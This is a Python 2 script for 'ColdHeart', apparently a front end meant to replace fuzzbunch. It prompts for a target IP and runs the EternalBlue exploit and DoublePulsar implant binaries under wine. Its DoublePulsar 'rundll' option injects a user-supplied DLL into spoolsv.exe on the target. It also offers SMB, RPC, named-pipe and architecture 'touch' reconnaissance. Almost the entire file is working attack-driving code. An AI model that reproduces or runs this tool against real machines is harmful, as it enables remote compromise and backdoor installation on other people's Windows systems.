#version:1.0

'''
Dependencies: wine, colorama
'''

### Imports
import os
import sys
import commands
import subprocess
from time import sleep
from random import choice
from imports.styles import *
from imports.banners import *
from datetime import datetime
from imports.update import update
from imports.paths import setup_paths
###

### Path setup
COLDHEART, CHDIR = setup_paths(os.path.realpath(__file__))
EXPLOIT_DIR = os.path.join(CHDIR, "exploits")
TOUCH_DIR = os.path.join(CHDIR, "touches")
LOG_DIR = os.path.join(CHDIR, "logs")
OPS_DIR = os.path.join(CHDIR, "OPS")
DP_OUTPUT = os.path.join(CHDIR, "DP_output")
###

### Menus
class menus_:
	def info(self):
		print('''ColdHeart is an execution environment designed to be a replacement for fuzzbunch.
Report any errors to: @elijah__bennett0 on instagram.
Check out CTRLALTECH GROUP on YouTube for a Coldheart tutorial and more.''')
	def start(self):
		print('''[1] Exploit menu
[2] Touch menu
[3] Exit''')	
	def exploits(self):
		print('''[1] EternalBlue
[2] DoublePulsar
[3] Back''')
	def touches(self):
		print('''[1] Named Pipe Touch
[2] RPC Touch
[3] SMB Touch
[4] Arch Touch
[5] Back''')

class color_:
	def red(self, s):
		print(Style.BRIGHT + Fore.RED + s + Style.RESET_ALL)
	def blue(self, s):
		print(Style.BRIGHT + Fore.BLUE + s + Style.RESET_ALL)
	def green(self, s):
		print(Style.BRIGHT + Fore.GREEN + s + Style.RESET_ALL)
	def yellow(self, s):
		print(Style.BRIGHT + Fore.YELLOW + s + Style.RESET_ALL)

def main():
	startup()
	menu1_answered = False
	while not menu1_answered:
		menu1 = raw_input(styles.question + "Option > ")
		if menu1 == "1": # exploits selected
			menus.exploits()
			menu1_answered = True
			exploit_menu_answered = False
			while not exploit_menu_answered:
				exploit_choice = raw_input(styles.question + "Exploit > ")
				if exploit_choice == "1": # eternalblue
					exploit_menu_answered = True
					ip = raw_input(styles.question + "Target IP > ")
					prints.info("Starting EternalBlue now...")
					proc = [(commands.getoutput("wine %s/eternalblue/Eternalblue-2.2.0.exe --inconfig %s/eternalblue/Eternalblue-2.2.0.0.xml --targetip %s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip)))]
					failed = False
					lines = proc[0].splitlines()
					output = []
					for line in lines:
						if '<' in line or '>' in line or line.startswith('w') or line[0].isdigit():
							pass
						else:
							output.append(line)
					for line in output:
						if "error" in line.lower():
							failed = True
						print line
					if failed:
						prints.bad("EternalBlue complete but an error was encountered.")
					else:
						prints.good("EteralBlue Complete.")
					continue_to_dp = False
					while not continue_to_dp:
						run_dp = raw_input(styles.question + "Continue to DoublePulsar? (y/n) > ")
						if run_dp.lower() == 'y':
							continue_to_dp = True
							dp_function_answered = False
							while not dp_function_answered:
								dp_function = raw_input(styles.question + "Functions: rundll, ping, uninstall. Function > ")
								if dp_function.lower() == "rundll":
									dp_function_answered = True
									prints.warning("You will need a DLL pre-made. Coldheart will not create a DLL for you.")
									dll = raw_input(styles.question + "DLL location (Ex. /root/Desktop/dll.dll) > ")
									proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function rundll --dllpayload %s --outputfile %s/%s --processname spoolsv.exe" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, dll, DP_OUTPUT, datetime.now())))]
									failed = False
									lines = proc[0].splitlines()
									output = []
									for line in lines:
										if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
											pass
										else:
											output.append(line)
									for line in output:
										if "error" in line.lower():
											failed = True
										print line
									if failed:
										prints.bad("DoublePulsar complete but an error was encountered.")
									else:
										prints.good("DoublePulsar Complete.")
								elif dp_function.lower() == "ping":
									dp_function_answered = True
									proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function ping --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
									failed = False
									lines = proc[0].splitlines()
									output = []
									for line in lines:
										if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
											pass
										else:
											output.append(line)
									for line in output:
										if "error" in line.lower():
											failed = True
										print line
									if failed:
										prints.bad('Doublepulsar complete, but an error was occurred.')
									else:
										prints.good('Doublepulsar Complete.')
								elif dp_function.lower() == "uninstall":
									dp_function_answered = True
									proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function uninstall --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
									failed = False
									lines = proc[0].splitlines()
									output = []
									for line in lines:
										if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
											pass
										else:
											output.append(line)
									for out in output:
										if "error" in out.lower():
											failed = True
										print(out)
									if failed:
										prints.bad('Doublepulsar complete, but an error was occurred.')
									else:	
										prints.good('Doublepulsar complete.')	
								else:
									prints.bad("Invalid Input.")
						elif run_dp.lower() == 'n':
							continue_to_dp = True
							menu1_answered = False
							prints.info("Returning to main menu...")
							menus.start()
						else:
							prints.bad("Invalid Input.")	
				elif exploit_choice == "2": # doublepulsar
					exploit_menu_answered = True
					ip = raw_input(styles.question + "Target IP > ")
					prints.info("Starting DoublePulsar now...")
					dp_function_answered = False
					while not dp_function_answered:
						dp_function = raw_input(styles.question + "Functions: rundll, ping, uninstall  Function > ")
						if dp_function.lower() == "rundll":
							dp_function_answered = True
							prints.warning("Make sure you have a dll ready!")
							dll = raw_input(styles.question + "DLL location ex. /root/Desktop/dll.dll > ")
							proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function rundll --dllpayload %s --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, dll, DP_OUTPUT, datetime.now())))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for line in output:
								if "error" in line.lower():
									failed = True
								print line
							if failed:
								prints.bad('DoublePulsar complete, but an error was encountered.')
							else:	
								prints.good('DoublePulsar Complete.')
						elif dp_function.lower() == "ping":
							dp_function_answered = True
							proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function ping --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for line in output:
								if "error" in line.lower():
									failed = True
								print line
							if failed:
								prints.bad('DoublePulsar complete, but an error was encountered.')
							else:	
								prints.good('DoublePulsar Complete.')
						elif dp_function.lower() == "uninstall":
							dp_function_answered = True
							proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function uninstall --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for line in output:
								if "error" in line.lower():
									failed = True
								print line
							if failed:
								prints.bad('DoublePulsar complete, but an error was encountered.')
							else:	
								prints.good('DoublePulsar Complete.')
				elif exploit_choice == "3": # back
					menu1_answered = False
					exploit_menu_answered = True
					prints.info("Returning to main menu...")
					menus.start()
				else: # invalid input
					prints.bad("Invalid Input.")	
					
		elif menu1 == "2": # touches selected
			menus.touches()
			menu1_answered = True
			touch_menu_answered = False
			while not touch_menu_answered:
				touch_choice = raw_input(styles.question + "Touch > ")
				if touch_choice == "1": # namedpipetouch
					touch_menu_answered = True
					ip = raw_input(styles.question + "Target IP > ")
					prints.info("Starting Named Pipe Touch...")
					proc = [(commands.getoutput("wine %s/namedpipetouch/Namedpipetouch-2.0.0.exe --inconfig %s/namedpipetouch/Namedpipetouch-2.0.0.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
					failed = False
					lines = proc[0].splitlines()
					output = []
					for line in lines:
						if "<" in line or "wine" in line:
							pass
						else:
							output.append(line)
					for line in output:
						if "error" in line.lower():
							failed = True
						print line
					if failed:
						prints.bad('NamedPipeTouch Complete, but an error was encountered.')
					else:	
						prints.good('NamedPipeTouch Complete.')			
				elif touch_choice == "2": # rpctouch
					touch_menu_answered = True
					ip = raw_input(styles.question + "Target IP > ")
					prints.info("Starting RPC Touch...")
					proc = [(commands.getoutput("wine %s/rpctouch/Rpctouch-2.1.0.exe --inconfig %s/rpctouch/Rpctouch-2.1.0.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
					failed = False
					lines = proc[0].splitlines()
					output = []
					for line in lines:	
						if "<" in line or "wine" in line:
							pass
						else:
							output.append(line)
					for line in output:
						if "error" in line.lower():
							failed = True
						print line
					if failed:
						prints.bad("RPC Touch Complete, but an error was encountered.")
					else:
						prints.good("RPC Touch Complete.")
				elif touch_choice == "3": # smbtouch
					touch_menu_answered = True
					ip = raw_input(styles.question + "Target IP > ")
					prints.info("Starting RPC Touch...")
					proc = [(commands.getoutput("wine %s/smbtouch/Smbtouch-1.1.1.exe --inconfig %s/smbtouch/Smbtouch-1.1.1.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
					failed = False
					lines = proc[0].splitlines()
					output = []
					for line in lines:
						if "<" in line or "wine" in line:
							pass
						else:
							output.append(line)
					for line in output:
						print line
					prints.good("SMB Touch Complete.")
				elif touch_choice == "4": # arch
					touch_menu_answered = True
					ip = raw_input(styles.question + "Target IP > ")
					prints.info("Starting ArchiTouch...")
					proc = [(commands.getoutput("wine %s/architouch/Architouch-1.0.0.exe --inconfig %s/architouch/Architouch-1.0.0.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
					failed = False
					lines = proc[0].splitlines()
					output = []
					for line in lines:
						if "<" in line or "wine" in line:
							pass
						else:
							output.append(line)
					for line in output:
						if "error" in line.lower():
							failed = True
						print line
					if failed:
						prints.bad("ArchiTouch Complete, but an error was encountered.")
					else:
						prints.good("ArchiTouch Complete.")				
				elif touch_choice == "5": # back
					touch_menu_answered = True
					menu1_answered = False
					prints.info("Returning to main menu...")
					menus.start()
				else: # invalid input
					prints.bad("Invalid Input.")
		elif menu1 == "3": # exit
			prints.info("Now exiting...")
			sleep(1)
			sys.exit(0)
		else: # invalid input
			prints.bad("Invalid Input.")
def startup():
	init()
	update(COLDHEART)
	sleep(3)
	banners = [banner1, banner2, banner3]
	color = color_()
	colors = [color.red, color.blue, color.green, color.yellow]
	subprocess.call("resize -s 25 125", shell=True)
	subprocess.call("clear", shell=True)
	choice(colors)(choice(banners))
	global menus
	menus = menus_()
	menus.info()
	menus.start()
	
if __name__ == "__main__":
	main()
